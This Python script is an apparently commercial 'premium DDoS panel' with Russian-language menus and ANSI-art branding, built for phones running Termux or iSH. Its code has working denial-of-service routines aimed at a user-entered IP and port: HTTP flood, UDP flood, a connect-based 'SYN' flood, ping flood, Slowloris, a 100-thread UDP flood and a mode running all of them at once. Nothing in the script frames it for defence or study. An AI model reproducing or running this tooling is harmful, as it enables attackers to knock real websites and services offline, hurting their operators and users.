#!/usr/bin/env python3
# -*- coding: utf-8 -*-

"""
██████╗░██████╗░░█████╗░░██████╗
██╔══██╗██╔══██╗██╔══██╗██╔════╝
██║░░██║██║░░██║██║░░██║╚█████╗░
██║░░██║██║░░██║██║░░██║░╚═══██╗
██████╔╝██████╔╝╚█████╔╝██████╔╝
╚═════╝░╚═════╝░░╚════╝░╚═════╝░

████████████████████████████████████████████████████████████████████████████████
█                                                                              █
█                     🔥 PREMIUM DDOS PANEL 🔥                                 █
█                     BY @DADILK VIP EDITION                                  █
█                     TERMUX / iSH READY                                       █
█                                                                              █
████████████████████████████████████████████████████████████████████████████████
"""

import os
import sys
import time
import random
import socket
import threading
import datetime
import platform
import subprocess
import struct
import signal
import http.client
import urllib.parse
import requests
from typing import Optional, Tuple

# ===================== ТОПОВЫЙ ГРАДИЕНТ (КРАСНЫЙ -> РОЗОВЫЙ) =====================

# Красный градиент (от ярко-красного до розового)
R1 = '\033[91m'  # Ярко-красный
R2 = '\033[91m'  # Красный
R3 = '\033[38;5;196m'  # Красный 2
R4 = '\033[38;5;197m'  # Красно-розовый
R5 = '\033[38;5;198m'  # Розовый
R6 = '\033[38;5;199m'  # Ярко-розовый
R7 = '\033[38;5;200m'  # Розовый 2
R8 = '\033[38;5;201m'  # Светло-розовый
R9 = '\033[95m'  # Пурпурный
RS = '\033[0m'   # Сброс

# Градиент для разных частей
G1 = R1  # Основной красный
G2 = R3  # Темно-красный для контраста
G3 = R5  # Розовый для акцентов
G4 = R8  # Светло-розовый для свечения

# ===================== ТОПОВЫЕ АСХИЧКИ ИЗ СИМВОЛОВ =====================

TOP_ASCII = f"""
{G4}██████╗░██████╗░░█████╗░░██████╗{RS}
{G3}██╔══██╗██╔══██╗██╔══██╗██╔════╝{RS}
{G2}██║░░██║██║░░██║██║░░██║╚█████╗░{RS}
{G1}██║░░██║██║░░██║██║░░██║░╚═══██╗{RS}
{G3}██████╔╝██████╔╝╚█████╔╝██████╔╝{RS}
{G4}╚═════╝░╚═════╝░░╚════╝░╚═════╝░{RS}

{G1}████████████████████████████████████████████████████████████████████████████████{RS}
{G3}█{RS}                                                                              {G3}█{RS}
{G2}█{RS}                     {G4}🔥 PREMIUM DDOS PANEL 🔥{RS}                                 {G2}█{RS}
{G1}█{RS}                     {G3}BY @DADILK VIP EDITION{RS}                                  {G1}█{RS}
{G4}█{RS}                     {G2}TERMUX / iSH READY{RS}                                       {G4}█{RS}
{G3}█{RS}                                                                              {G3}█{RS}
{G1}████████████████████████████████████████████████████████████████████████████████{RS}
"""

MENU_ASCII = f"""
{G1}████████████████████████████████████████████████████████████████████████████████{RS}
{G3}█{RS}                                                                              {G3}█{RS}
{G2}█{RS}                     {G4}╔════════════════════════╗{RS}                          {G2}█{RS}
{G1}█{RS}                     {G3}║      {G4}██╗░░░██╗██╗{RS}      {G3}║{RS}                          {G1}█{RS}
{G4}█{RS}                     {G2}║      {G1}██║░░░██║██║{RS}      {G2}║{RS}                          {G4}█{RS}
{G3}█{RS}                     {G4}║      {G2}╚██╗░██╔╝██║{RS}      {G4}║{RS}                          {G3}█{RS}
{G2}█{RS}                     {G1}║      {G3}░╚████╔╝░██║{RS}      {G1}║{RS}                          {G2}█{RS}
{G1}█{RS}                     {G4}║      {G2}░░╚██╔╝░░╚═╝{RS}      {G4}║{RS}                          {G1}█{RS}
{G3}█{RS}                     {G1}╚════════════════════════╝{RS}                          {G3}█{RS}
{G2}█{RS}                                                                              {G2}█{RS}
{G4}█{RS}                     {G1}╔═══════════════════════╗{RS}                           {G4}█{RS}
{G3}█{RS}                     {G2}║{RS}  {G3}[{G1}01{RS}{G3}]{RS} {G4}HTTP FLOOD       {G2}║{RS}                           {G3}█{RS}
{G2}█{RS}                     {G4}║{RS}  {G1}[{G2}02{RS}{G1}]{RS} {G3}UDP FLOOD        {G4}║{RS}                           {G2}█{RS}
{G1}█{RS}                     {G3}║{RS}  {G4}[{G3}03{RS}{G4}]{RS} {G1}TCP SYN FLOOD    {G3}║{RS}                           {G1}█{RS}
{G4}█{RS}                     {G2}║{RS}  {G1}[{G4}04{RS}{G1}]{RS} {G2}ICMP FLOOD       {G2}║{RS}                           {G4}█{RS}
{G3}█{RS}                     {G1}║{RS}  {G2}[{G3}05{RS}{G2}]{RS} {G4}SLOWLORIS        {G1}║{RS}                           {G3}█{RS}
{G2}█{RS}                     {G4}║{RS}  {G3}[{G2}06{RS}{G3}]{RS} {G1}MULTI THREAD     {G4}║{RS}                           {G2}█{RS}
{G1}█{RS}                     {G3}║{RS}  {G4}[{G1}07{RS}{G4}]{RS} {G2}VIP MODE         {G3}║{RS}                           {G1}█{RS}
{G4}█{RS}                     {G2}║{RS}  {G1}[{G3}00{RS}{G1}]{RS} {G4}EXIT            {G2}║{RS}                           {G4}█{RS}
{G3}█{RS}                     {G1}╚═══════════════════════╝{RS}                           {G3}█{RS}
{G2}█{RS}                                                                              {G2}█{RS}
{G1}████████████████████████████████████████████████████████████████████████████████{RS}
"""

ATTACK_ASCII = f"""
{G1}████████████████████████████████████████████████████████████████████████████████{RS}
{G3}█{RS}                                                                              {G3}█{RS}
{G2}█{RS}                     {G4}╔════════════════════════╗{RS}                          {G2}█{RS}
{G1}█{RS}                     {G3}║{RS}  {G4}█████████████████████{RS}  {G3}║{RS}                          {G1}█{RS}
{G4}█{RS}                     {G2}║{RS}  {G1}██{RS} {G3}🔥 АТАКА 🔥{RS} {G1}██{RS}  {G2}║{RS}                          {G4}█{RS}
{G3}█{RS}                     {G4}║{RS}  {G2}█████████████████████{RS}  {G4}║{RS}                          {G3}█{RS}
{G2}█{RS}                     {G1}║{RS}  {G4}██{RS} {G2}⚡⚡⚡⚡⚡⚡⚡{RS} {G4}██{RS}  {G1}║{RS}                          {G2}█{RS}
{G1}█{RS}                     {G3}║{RS}  {G2}█████████████████████{RS}  {G3}║{RS}                          {G1}█{RS}
{G4}█{RS}                     {G2}╚════════════════════════╝{RS}                          {G4}█{RS}
{G3}█{RS}                                                                              {G3}█{RS}
{G2}█{RS}                     {G1}╔════════════════════════╗{RS}                          {G2}█{RS}
{G1}█{RS}                     {G4}║{RS}  {G3}██████{RS} {G2}██████{RS} {G1}██████{RS}  {G4}║{RS}                          {G1}█{RS}
{G4}█{RS}                     {G2}║{RS}  {G1}██{RS}      {G3}СТАТУС{RS}      {G1}██{RS}  {G2}║{RS}                          {G4}█{RS}
{G3}█{RS}                     {G1}║{RS}  {G4}██████{RS} {G2}██████{RS} {G3}██████{RS}  {G1}║{RS}                          {G3}█{RS}
{G2}█{RS}                     {G4}╚════════════════════════╝{RS}                          {G2}█{RS}
{G1}█{RS}                                                                              {G1}█{RS}
{G3}████████████████████████████████████████████████████████████████████████████████{RS}
"""

# ===================== ОСНОВНОЙ КОД DDOS =====================

class DDOS_Panel:
    def __init__(self):
        self.running = True
        self.attack_threads = []
        self.stop_attack = False
        self.packets_sent = 0
        self.bytes_sent = 0
        self.start_time = None
        
    def clear_screen(self):
        os.system('clear' if os.name == 'posix' else 'cls')
    
    def print_red_gradient(self, text, style="normal"):
        """Печать текста с красным градиентом"""
        if style == "title":
            colors = [R1, R2, R3, R4, R5, R6, R7, R8, R9]
        elif style == "warning":
            colors = [R1, R2, R3, R4]
        else:
            colors = [R4, R5, R6, R7]
        
        for i, char in enumerate(text):
            color = colors[i % len(colors)]
            print(f"{color}{char}{RS}", end="")
        print()
    
    def create_socket(self):
        """Создание сокета"""
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
            s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
            return s
        except:
            return None
    
    def http_flood(self, target_ip, target_port, duration):
        """HTTP флуд"""
        end_time = time.time() + duration
        while time.time() < end_time and not self.stop_attack:
            try:
                conn = http.client.HTTPConnection(f"{target_ip}:{target_port}", timeout=5)
                conn.request("GET", "/", headers={
                    "User-Agent": random.choice(self.user_agents),
                    "Accept": "*/*",
                    "Connection": "keep-alive"
                })
                conn.getresponse()
                conn.close()
                self.packets_sent += 1
            except:
                pass
    
    def udp_flood(self, target_ip, target_port, duration):
        """UDP флуд"""
        end_time = time.time() + duration
        sock = self.create_socket()
        if not sock:
            return
        
        packet_size = random.randint(1024, 65507)
        packet = random._urandom(packet_size)
        
        while time.time() < end_time and not self.stop_attack:
            try:
                sock.sendto(packet, (target_ip, target_port))
                self.packets_sent += 1
                self.bytes_sent += packet_size
            except:
                pass
        
        sock.close()
    
    def tcp_syn_flood(self, target_ip, target_port, duration):
        """TCP SYN флуд"""
        end_time = time.time() + duration
        while time.time() < end_time and not self.stop_attack:
            try:
                s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                s.settimeout(2)
                s.connect_ex((target_ip, target_port))
                s.close()
                self.packets_sent += 1
            except:
                pass
    
    def icmp_flood(self, target_ip, target_port, duration):
        """ICMP пинг флуд"""
        end_time = time.time() + duration
        while time.time() < end_time and not self.stop_attack:
            try:
                result = subprocess.run(
                    ['ping', '-c', '1', '-W', '1', target_ip],
                    capture_output=True,
                    timeout=1
                )
                self.packets_sent += 1
            except:
                pass
    
    def slowloris(self, target_ip, target_port, duration):
        """Slowloris атака"""
        sockets = []
        end_time = time.time() + duration
        
        # Создание сокетов
        for _ in range(200):
            try:
                s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                s.settimeout(4)
                s.connect((target_ip, target_port))
                s.send(f"GET /?{random.randint(0, 2000)} HTTP/1.1\r\n".encode())
                s.send(f"Host: {target_ip}\r\n".encode())
                s.send("User-Agent: Mozilla/5.0\r\n".encode())
                s.send("Accept-language: en-US,en\r\n".encode())
                sockets.append(s)
                self.packets_sent += 1
            except:
                pass
        
        # Поддержание соединений
        while time.time() < end_time and not self.stop_attack:
            for s in sockets:
                try:
                    s.send(f"X-a: {random.randint(1, 5000)}\r\n".encode())
                    self.packets_sent += 1
                except:
                    sockets.remove(s)
                    try:
                        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                        s.settimeout(4)
                        s.connect((target_ip, target_port))
                        s.send(f"GET /?{random.randint(0, 2000)} HTTP/1.1\r\n".encode())
                        s.send(f"Host: {target_ip}\r\n".encode())
                        sockets.append(s)
                    except:
                        pass
            time.sleep(10)
    
    def multi_thread_flood(self, target_ip, target_port, duration):
        """Многопоточная атака"""
        threads = []
        for _ in range(100):
            t = threading.Thread(target=self.udp_flood, args=(target_ip, target_port, duration))
            t.daemon = True
            threads.append(t)
            t.start()
        
        for t in threads:
            t.join()
    
    def vip_mode(self, target_ip, target_port, duration):
        """VIP режим - все атаки сразу"""
        print(f"\n{G1}█ VIP MODE АКТИВИРОВАН █{RS}")
        print(f"{G3}► Запуск всех видов атак одновременно{RS}\n")
        
        attacks = [
            self.http_flood,
            self.udp_flood,
            self.tcp_syn_flood,
            self.icmp_flood,
            self.slowloris
        ]
        
        threads = []
        for attack in attacks:
            t = threading.Thread(target=attack, args=(target_ip, target_port, duration))
            t.daemon = True
            threads.append(t)
            t.start()
        
        # Мониторинг
        end_monitor = time.time() + duration
        while time.time() < end_monitor and not self.stop_attack:
            elapsed = int(time.time() - self.start_time)
            remaining = duration - elapsed
            
            print(f"\r{G4}► ВРЕМЯ: {elapsed}с | ОСТАЛОСЬ: {remaining}с | ПАКЕТОВ: {self.packets_sent} | {G1}█" * 50 + f"{RS}", end="")
            time.sleep(1)
        
        for t in threads:
            t.join()
    
    def attack_menu(self):
        """Меню выбора атаки"""
        self.user_agents = [
            "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36",
            "Mozilla/5.0 (iPhone; CPU iPhone OS 14_0 like Mac OS X) AppleWebKit/605.1.15",
            "Mozilla/5.0 (Linux; Android 11; SM-G998B) AppleWebKit/537.36",
            "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15",
            "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36"
        ]
        
        while True:
            self.clear_screen()
            print(TOP_ASCII)
            print(MENU_ASCII)
            
            print(f"\n{G2}══════════════════════════════════════════════════════════════════{RS}")
            target_ip = input(f"{G4}● Введите IP цели {G1}→{RS} {G3}").strip()
            
            if target_ip.lower() == 'exit' or target_ip == '0':
                break
            
            target_port = input(f"{G4}● Введите порт {G1}→{RS} {G3}").strip()
            try:
                target_port = int(target_port)
            except:
                print(f"{R1}● Ошибка: неверный порт{RS}")
                time.sleep(1)
                continue
            
            duration = input(f"{G4}● Длительность атаки (сек) {G1}→{RS} {G3}").strip()
            try:
                duration = int(duration)
            except:
                print(f"{R1}● Ошибка: неверная длительность{RS}")
                time.sleep(1)
                continue
            
            print(f"\n{G2}══════════════════════════════════════════════════════════════════{RS}")
            print(f"{G1}█{RS} {G4}Выберите тип атаки:{RS}")
            print(f"{G3}█{RS} {G1}[1]{RS} {G4}HTTP FLOOD{RS}")
            print(f"{G2}█{RS} {G3}[2]{RS} {G1}UDP FLOOD{RS}")
            print(f"{G4}█{RS} {G2}[3]{RS} {G3}TCP SYN FLOOD{RS}")
            print(f"{G1}█{RS} {G4}[4]{RS} {G2}ICMP FLOOD{RS}")
            print(f"{G3}█{RS} {G1}[5]{RS} {G4}SLOWLORIS{RS}")
            print(f"{G2}█{RS} {G3}[6]{RS} {G1}MULTI THREAD{RS}")
            print(f"{G4}█{RS} {G2}[7]{RS} {G3}VIP MODE{RS}")
            print(f"{G1}█{RS} {G4}[0]{RS} {G2}НАЗАД{RS}")
            
            choice = input(f"\n{G4}● Ваш выбор {G1}→{RS} {G3}").strip()
            
            attack_func = None
            if choice == '1':
                attack_func = self.http_flood
                attack_name = "HTTP FLOOD"
            elif choice == '2':
                attack_func = self.udp_flood
                attack_name = "UDP FLOOD"
            elif choice == '3':
                attack_func = self.tcp_syn_flood
                attack_name = "TCP SYN FLOOD"
            elif choice == '4':
                attack_func = self.icmp_flood
                attack_name = "ICMP FLOOD"
            elif choice == '5':
                attack_func = self.slowloris
                attack_name = "SLOWLORIS"
            elif choice == '6':
                attack_func = self.multi_thread_flood
                attack_name = "MULTI THREAD"
            elif choice == '7':
                attack_func = self.vip_mode
                attack_name = "VIP MODE"
            elif choice == '0':
                continue
            else:
                print(f"{R1}● Неверный выбор!{RS}")
                time.sleep(1)
                continue
            
            # Запуск атаки
            self.clear_screen()
            print(TOP_ASCII)
            print(ATTACK_ASCII)
            
            print(f"\n{G2}══════════════════════════════════════════════════════════════════{RS}")
            print(f"{G1}█{RS} {G4}ЦЕЛЬ:{RS} {G3}{target_ip}:{target_port}{RS}")
            print(f"{G2}█{RS} {G1}АТАКА:{RS} {G4}{attack_name}{RS}")
            print(f"{G3}█{RS} {G2}ДЛИТЕЛЬНОСТЬ:{RS} {G1}{duration} сек{RS}")
            print(f"{G4}█{RS} {G3}СТАТУС:{RS} {G2}⚡ ЗАПУЩЕНО ⚡{RS}")
            print(f"{G1}█{RS} {G4}ДЛЯ ОСТАНОВКИ НАЖМИТЕ CTRL+C{RS}")
            print(f"{G2}══════════════════════════════════════════════════════════════════{RS}\n")
            
            self.stop_attack = False
            self.packets_sent = 0
            self.bytes_sent = 0
            self.start_time = time.time()
            
            # Запуск атаки в отдельном потоке
            attack_thread = threading.Thread(
                target=attack_func,
                args=(target_ip, target_port, duration)
            )
            attack_thread.daemon = True
            attack_thread.start()
            
            # Мониторинг
            try:
                end_time = time.time() + duration
                while time.time() < end_time:
                    elapsed = int(time.time() - self.start_time)
                    remaining = duration - elapsed
                    bps = self.bytes_sent / elapsed if elapsed > 0 else 0
                    
                    stats = f"""
    {G1}╔══════════════════════════════════════════════════════════╗
    {G3}║  ВРЕМЯ: {elapsed:4d}с | ОСТАЛОСЬ: {remaining:4d}с              ║
    {G2}║  ПАКЕТОВ ОТПРАВЛЕНО: {self.packets_sent:10d}                 ║
    {G4}║  ДАННЫХ ОТПРАВЛЕНО: {self.bytes_sent/1024/1024:6.2f} MB              ║
    {G1}║  СКОРОСТЬ: {bps/1024:6.2f} KB/s                              ║
    {G3}╚══════════════════════════════════════════════════════════╝{RS}
                    """
                    print(stats)
                    time.sleep(1)
                    
                    # Перемещаем курсор вверх для обновления
                    print(f"\033[{7}A")
                
                print(f"\n{G1}█{RS} {G4}АТАКА ЗАВЕРШЕНА!{RS} {G3}Отправлено {self.packets_sent} пакетов{RS}\n")
                
            except KeyboardInterrupt:
                self.stop_attack = True
                print(f"\n\n{G1}█{RS} {R1}АТАКА ОСТАНОВЛЕНА ПОЛЬЗОВАТЕЛЕМ{RS}\n")
            
            input(f"{G4}● Нажмите ENTER для продолжения...{RS}")
    
    def run(self):
        """Запуск панели"""
        # Проверка на Termux/iSH
        if 'ANDROID_ROOT' in os.environ:
            print(f"{G3}✅ Termux обнаружен!{RS}")
        elif 'ISH' in os.environ or 'iSH' in os.environ:
            print(f"{G4}✅ iSH обнаружен!{RS}")
        
        # Проверка наличия root (для некоторых функций)
        has_root = os.geteuid() == 0 if hasattr(os, 'geteuid') else False
        
        self.clear_screen()
        print(TOP_ASCII)
        print(f"\n{G2}══════════════════════════════════════════════════════════════════{RS}")
        print(f"{G1}█{RS} {G4}ROOT СТАТУС:{RS} {G3}{'✅ ДОСТУПЕН' if has_root else '❌ НЕ ДОСТУПЕН'}{RS}")
        print(f"{G3}█{RS} {G1}ПЛАТФОРМА:{RS} {G4}{platform.system()} {platform.release()}{RS}")
        print(f"{G4}█{RS} {G2}РАЗРАБОТЧИК:{RS} {G3}@DADILK VIP{RS}")
        print(f"{G2}══════════════════════════════════════════════════════════════════{RS}\n")
        
        input(f"{G4}● Нажмите ENTER для продолжения...{RS}")
        
        # Запуск основного меню
        self.attack_menu()
        
        # Выход
        self.clear_screen()
        print(TOP_ASCII)
        print(f"""
{G1}████████████████████████████████████████████████████████████████████████████████{RS}
{G3}█{RS}                                                                              {G3}█{RS}
{G2}█{RS}                     {G4}╔════════════════════════╗{RS}                          {G2}█{RS}
{G1}█{RS}                     {G3}║{RS}  {G4}██████╗░██╗░░░██╗██╗{RS}  {G3}║{RS}                          {G1}█{RS}
{G4}█{RS}                     {G2}║{RS}  {G1}██╔══██╗██║░░░██║██║{RS}  {G2}║{RS}                          {G4}█{RS}
{G3}█{RS}                     {G4}║{RS}  {G2}██║░░██║╚██╗░██╔╝██║{RS}  {G4}║{RS}                          {G3}█{RS}
{G2}█{RS}                     {G1}║{RS}  {G3}██║░░██║░╚████╔╝░██║{RS}  {G1}║{RS}                          {G2}█{RS}
{G1}█{RS}                     {G4}║{RS}  {G2}██████╔╝░░╚██╔╝░░╚═╝{RS}  {G4}║{RS}                          {G1}█{RS}
{G3}█{RS}                     {G1}╚════════════════════════╝{RS}                          {G3}█{RS}
{G2}█{RS}                                                                              {G2}█{RS}
{G4}█{RS}                     {G3}СПАСИБО ЗА ИСПОЛЬЗОВАНИЕ{RS}                            {G4}█{RS}
{G1}█{RS}                     {G2}BY @DADILK PREMIUM{RS}                                   {G1}█{RS}
{G3}████████████████████████████████████████████████████████████████████████████████{RS}

{G4}обход by DADILK{RS}
{G1}Спасибо за покупку ❤️‍🩹✅{RS}
        """)
        time.sleep(3)

# ===================== ЗАПУСК =====================

if __name__ == "__main__":
    try:
        panel = DDOS_Panel()
        panel.run()
    except KeyboardInterrupt:
        print(f"\n\n{G4}обход by DADILK{RS}")
        print(f"{G1}Спасибо за покупку ❤️‍🩹✅{RS}")
        sys.exit(0)
    except Exception as e:
        print(f"\n{R1}Ошибка: {e}{RS}")
        print(f"{G4}обход by DADILK{RS}")
        print(f"{G1}Спасибо за покупку ❤️‍🩹✅{RS}")
        sys.exit(1)
